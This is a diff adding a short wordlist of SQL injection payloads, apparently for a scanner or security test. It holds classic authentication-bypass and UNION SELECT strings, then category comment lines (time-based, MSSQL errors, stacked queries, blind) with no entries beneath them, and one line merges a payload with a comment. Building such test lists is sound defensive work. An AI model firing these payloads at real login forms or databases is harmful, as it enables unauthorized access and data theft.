@@ -1,0 +1,12 @@
+' OR '1'='1
+' OR 1=1 --
+" OR "1"="1
+' UNION SELECT NULL, NULL --
+' OR 1=1#
+' OR 1=1/*
+') OR ('1'='1
+admin' -- -- Time-based detection payloads
+-- MSSQL specific errors
+-- UNION-based SQL injection patterns
+-- Stacked query detection payloads
+-- Blind SQL injection time-based detection
